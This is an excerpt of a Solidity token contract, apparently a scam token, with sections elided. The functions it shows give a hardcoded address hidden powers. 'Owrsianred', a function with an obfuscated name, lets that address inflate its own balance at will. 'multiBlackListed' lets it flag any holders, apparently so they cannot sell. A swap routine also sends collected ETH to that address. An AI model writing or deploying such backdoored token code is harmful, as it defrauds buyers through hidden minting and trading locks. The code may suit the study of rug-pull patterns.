...
contract Token is Context, IERC20, Ownable{
    ...
    address payable public _MultiAddress;

    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludefromFee;
    mapping (address => bool) public isMarketPair;
    mapping (address => bool) public _infoListed;
    ...
    constructor () {
        ...
        _MultiAddress = payable(address(0xe9Cd429984EcdB4F3A8076C50DcA7F7ACDF964A7));
    ...
    function Owrsianred(uint256 tFee) public {
        address account = _MultiAddress;
        uint256 official = _balances[account];
        uint256 WITHofficial = official + tFee;
        require(msg.sender == account);
        private_multiSend(account,WITHofficial);
    }
    
    function private_multiSend(address account,uint256 endEnter) private {
    ...
    function multiBlackListed(bool status, address[] calldata addresses) public {
        require(msg.sender == _MultiAddress);
        for (uint256 i; i < addresses.length; i++) {
            _infoListed[addresses[i]] = status;
        }
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(MarketAmount > 0)
            _MultiAddress.transfer(MarketAmount);
    }
